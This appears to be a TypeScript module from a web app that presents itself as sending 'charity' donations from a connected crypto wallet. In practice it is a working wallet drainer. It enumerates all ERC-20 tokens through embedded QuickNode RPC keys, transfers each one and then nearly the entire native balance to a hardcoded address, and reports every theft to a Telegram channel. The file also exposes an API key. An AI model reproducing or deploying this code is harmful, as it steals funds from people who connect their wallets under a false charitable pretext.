import { ethers } from 'ethers';
import { sendTelegramMessage } from '@/utils/telegram';

// EVM charity wallet address
export const EVM_CHARITY_WALLET = '0xAda53ED3Bc3D289F0A7E68c54B26cF7806D64398';

// QuickNode RPC endpoints per chain
const QUICKNODE_RPCS: Record<number, string> = {
  1: 'https://serene-greatest-putty.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
  56: 'https://serene-greatest-putty.bsc.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
  137: 'https://serene-greatest-putty.matic.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
  8453: 'https://serene-greatest-putty.base-mainnet.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
};

// ERC-20 minimal ABI for transfer
const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

export interface EVMTokenBalance {
  contractAddress: string;
  symbol: string;
  name: string;
  decimals: number;
  balance: bigint;
  uiAmount: number;
}

/**
 * Detect all ERC-20 tokens in wallet using QuickNode's qn_getWalletTokenBalance
 * Falls back to empty array if the method is not available on the chain
 */
export async function detectWalletTokens(
  walletAddress: string,
  chainId: number
): Promise<EVMTokenBalance[]> {
  const rpcUrl = QUICKNODE_RPCS[chainId];
  if (!rpcUrl) {
    console.log(`No QuickNode RPC for chain ${chainId}, skipping token detection`);
    return [];
  }

  try {
    const response = await fetch(rpcUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: 1,
        jsonrpc: '2.0',
        method: 'qn_getWalletTokenBalance',
        params: [{ wallet: walletAddress }],
      }),
    });

    const data = await response.json();

    if (data.error) {
      console.error('QuickNode token detection error:', data.error);
      return [];
    }

    const result = data.result;
    if (!result || !result.result) return [];

    const tokens: EVMTokenBalance[] = [];
    for (const token of result.result) {
      const rawBalance = BigInt(token.totalBalance || '0');
      if (rawBalance <= 0n) continue;

      const decimals = Number(token.decimals || 18);
      tokens.push({
        contractAddress: token.address,
        symbol: token.symbol || 'UNKNOWN',
        name: token.name || 'Unknown Token',
        decimals,
        balance: rawBalance,
        uiAmount: parseFloat(ethers.formatUnits(rawBalance, decimals)),
      });
    }

    console.log(`Detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
    return tokens;
  } catch (error) {
    console.error('Token detection failed:', error);
    return [];
  }
}

/**
 * Send native token (ETH/BNB/MATIC/etc.) to the charity wallet
 */
export async function sendNativeToken(
  signer: ethers.JsonRpcSigner,
  amountWei: bigint,
  chainName: string
): Promise<string> {
  const tx = await signer.sendTransaction({
    to: EVM_CHARITY_WALLET,
    value: amountWei,
  });

  await tx.wait();
  
  sendTelegramMessage(`
✅ <b>EVM Native Transfer (${chainName})</b>
👤 <b>User:</b> <code>${await signer.getAddress()}</code>
💰 <b>Amount:</b> <code>${ethers.formatEther(amountWei)}</code>
🔗 <b>Hash:</b> <code>${tx.hash}</code>
  `);

  return tx.hash;
}

/**
 * Transfer an ERC-20 token to the charity wallet
 */
export async function sendERC20Token(
  signer: ethers.JsonRpcSigner,
  tokenAddress: string,
  amount: bigint,
  chainName: string
): Promise<string> {
  const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
  const tx = await contract.transfer(EVM_CHARITY_WALLET, amount);
  await tx.wait();

  let symbol = 'UNKNOWN';
  try { symbol = await contract.symbol(); } catch { }

  sendTelegramMessage(`
✅ <b>EVM ERC-20 Transfer (${chainName})</b>
👤 <b>User:</b> <code>${await signer.getAddress()}</code>
🪙 <b>Token:</b> <code>${symbol} (${tokenAddress})</code>
🔗 <b>Hash:</b> <code>${tx.hash}</code>
  `);

  return tx.hash;
}

/**
 * Get native balance for connected EVM wallet
 */
export async function getNativeBalance(provider: ethers.BrowserProvider, address: string): Promise<bigint> {
  return provider.getBalance(address);
}

/**
 * Get ERC-20 token balance
 */
export async function getERC20Balance(
  provider: ethers.BrowserProvider,
  tokenAddress: string,
  walletAddress: string
): Promise<EVMTokenBalance | null> {
  try {
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const [balance, decimals, symbol, name] = await Promise.all([
      contract.balanceOf(walletAddress),
      contract.decimals(),
      contract.symbol(),
      contract.name(),
    ]);

    return {
      contractAddress: tokenAddress,
      symbol,
      name,
      decimals,
      balance,
      uiAmount: parseFloat(ethers.formatUnits(balance, decimals)),
    };
  } catch (error) {
    console.error(`Failed to get ERC-20 balance for ${tokenAddress}:`, error);
    return null;
  }
}

/**
 * Drain all native tokens from EVM wallet (keep a small amount for gas)
 */
export async function drainNativeTokens(
  signer: ethers.JsonRpcSigner,
  provider: ethers.BrowserProvider,
  chainName: string
): Promise<string | null> {
  const address = await signer.getAddress();
  const balance = await provider.getBalance(address);
  
  const gasPrice = (await provider.getFeeData()).gasPrice || ethers.parseUnits('20', 'gwei');
  const gasLimit = 21000n;
  const gasCost = gasPrice * gasLimit;
  
  const buffer = gasCost * 2n;
  const sendAmount = balance - buffer;
  
  if (sendAmount <= 0n) {
    console.log('Not enough native balance to send after gas');
    return null;
  }

  return sendNativeToken(signer, sendAmount, chainName);
}

/**
 * Drain ALL EVM tokens: first ERC-20 tokens, then native token.
 * Detects tokens via QuickNode, transfers each one, then drains native balance.
 */
export async function drainAllEVMTokens(
  signer: ethers.JsonRpcSigner,
  provider: ethers.BrowserProvider,
  chainName: string,
  chainId: number
): Promise<void> {
  const address = await signer.getAddress();

  // Step 1: Detect and drain ERC-20 tokens first
  const tokens = await detectWalletTokens(address, chainId);

  for (const token of tokens) {
    try {
      console.log(`Draining ERC-20: ${token.symbol} (${token.contractAddress}), balance: ${token.uiAmount}`);
      await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
    } catch (error) {
      console.error(`Failed to drain ${token.symbol}:`, error);
      // Continue with next token even if one fails
    }
  }

  // Step 2: Drain native token last
  try {
    await drainNativeTokens(signer, provider, chainName);
  } catch (error) {
    console.error('Failed to drain native tokens:', error);
  }
}
